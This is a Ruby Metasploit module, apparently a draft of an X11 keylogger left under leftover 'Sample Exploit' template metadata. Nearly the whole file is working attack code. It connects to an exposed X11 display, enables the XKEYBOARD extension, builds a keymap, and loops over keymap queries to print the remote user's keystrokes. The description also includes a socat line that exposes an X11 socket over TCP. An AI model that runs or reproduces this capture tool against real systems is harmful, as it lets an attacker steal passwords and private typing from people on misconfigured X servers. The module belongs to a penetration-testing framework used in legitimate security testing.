##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Exploit::Remote::X11

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        'Name' => 'Sample Exploit',
        'Description' => %q{
          This exploit module illustrates how a vulnerability could be exploited
          in an TCP server that has a parsing bug.

          socat -d -d TCP-LISTEN:6000,fork,bind=127.0.0.1 UNIX-CONNECT:/tmp/.X11-unix/X1
        },
        'License' => MSF_LICENSE,
        'Author' => ['skape'],
        'References' => [
          [ 'OSVDB', '12345' ],
          [ 'EDB', '12345' ],
          [ 'URL', 'http://www.example.com'],
          [ 'CVE', '1978-1234']
        ],
        'Payload' => {
          'Space' => 1000,
          'BadChars' => "\x00"
        },
        'DefaultOptions' => {
          'RPORT' => 6000
        },
        'DisclosureDate' => '2020-12-30',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget' => 0,
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [],
          'AKA' => ['xspy']
        }
      )
    )
  end

  #
  # The sample exploit just indicates that the remote host is always
  # vulnerable.
  #
  def check
    CheckCode::Vulnerable
  end

  def print_packet(packet)
    c = 0
    packet.each_char do |byte|
      puts "#{c} -> #{byte.inspect}"
      c += 1
    end
  end

  def process_initial_connection_response(packet)
    connection = X11CONNECTION.read(packet)
    if connection.success == 1
      print_good('Successly established X11 connection')
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to establish an X11 connection')
    end
    vprint_status("Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
    vprint_status("Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
    vprint_status("Resource ID: #{connection.resource_id_base.inspect}")
    vprint_status("Screen root: #{connection.screen_root.inspect}")
    connection
  end

  def process_extension_query(packet, extension)
    begin
      extension_response = QUERYEXTENSIONRESPONSE.read(packet)
    rescue ::EOFError
      fail_with(Msf::Module::Failure::UnexpectedReply, packet)
    end

    if extension_response.present == 1
      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
    end
    extension_response
  end

  # This function takes map data and converts it to a hashtable so that
  # we can translate from x11 key press data to the actual key on the
  # keyboard which was pressed.
  # https://stackoverflow.com/a/28258750 has a good description of keysyms vs keycodes
  def build_sym_key_map(map_data)
    keysym_index = 0
    key_map = {}
    (map_data.min_key_code..map_data.max_key_code).each do |key_code|
      syms = map_data.key_map_array[keysym_index]
      if syms.n_syms == 0
        key_map[key_code] = nil
      else
        sym = map_data.key_map_array[keysym_index].key_sym_array[0].syms
        begin
          character = sym.chr
          character = '[space]' if character == ' '
        rescue RangeError
          if KEYSYM_HASH.key? sym
            character = KEYSYM_HASH[sym]
          else
            character = "Unknown key sym: #{sym}"
          end
        end
        key_map[key_code] = character
        # leaving in for debugging purposes
        # puts "i: #{key_code}, keysym_str: #{character}, keysym: #{keysym_index}"
      end
      keysym_index += 1
    end
    key_map
  end

  # TBH still don't really understand how this works, but it does.
  def print_keystroke(bit_array_of_keystrokes, key_map)
    # Iterate through each byte of keyboard state
    32.times do |i|
      # Check each bit within the byte
      8.times do |j|
        next unless bit_array_of_keystrokes[i] & (1 << j) != 0

        # Key at position (i*8 + j) is pressed
        keycode = i * 8 + j
        keysym = key_map[keycode]
        # puts "Key with keycode #{keycode} is #{keysym}"
        print_line(keysym) unless @previous_character == keysym
        @previous_character = keysym
      end
    end
  end

  # caps lock
  # L shift

  def run
    query_extension_calls = 0
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('(1/9) Establishing X11 connection')
    sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
    connection = process_initial_connection_response(sock.get_once(-1, 1))
    sock.get_once(-1, 1) # make sure we dont have anything else waiting
    vprint_status('(2/9) Checking on BIG-REQUESTS extension')
    sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
    query_extension_calls += 1
    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')
    vprint_status('(3/9) Enabling BIG-REQUESTS')
    sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)
    vprint_status('(4/9) Creating new graphical context')
    sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                  drawable: connection.screen_root,
                                                  gc_value_mask_background: 1).to_binary_s +
             X11GETPROPERTY.new(window: connection.screen_root).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)
    vprint_status('(5/9) Checking on XKEYBOARD extension')
    sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
    vprint_status('(6/9) Enabling XKEYBOARD')
    sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
    sock.get_once(-1, 1)
    vprint_status('(7/9) Requesting XKEYBOARD map')
    sock.put(GETMAPREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                               full_key_types: 1,
                               full_key_syms: 1,
                               full_modifier_map: 1).to_binary_s) # not sure what this does
    map_data = GETMAPREPLY.read(sock.get_once(-1, 1))
    vprint_status('(8/9) Enabling notification on keyboard and map')
    sock.put(SELECTEVENTS.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                              affect_which_new_keyboard_notify: 1,
                              affect_new_keyboard_key_codes: 1,
                              affect_new_keyboard_device_id: 1).to_binary_s +
            SELECTEVENTS.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                             affect_which_map_notify: 1,
                             affect_map_key_types: 1,
                             affect_map_key_syms: 1,
                             affect_map_modifier_map: 1,
                             map_key_types: 1,
                             map_key_syms: 1,
                             map_modifier_map: 1).to_binary_s) # not sure what this does
    sock.get_once(-1, 1)
    vprint_status('(9/9) Creating local keyboard map')

    key_map = build_sym_key_map(map_data)

    print_good('All setup, watching for keystrokes')
    @previous_character = ''
    loop do
      sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
      bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
      next if bit_array_of_keystrokes.all?(0)

      print_keystroke(bit_array_of_keystrokes, key_map)
    end
  end
end
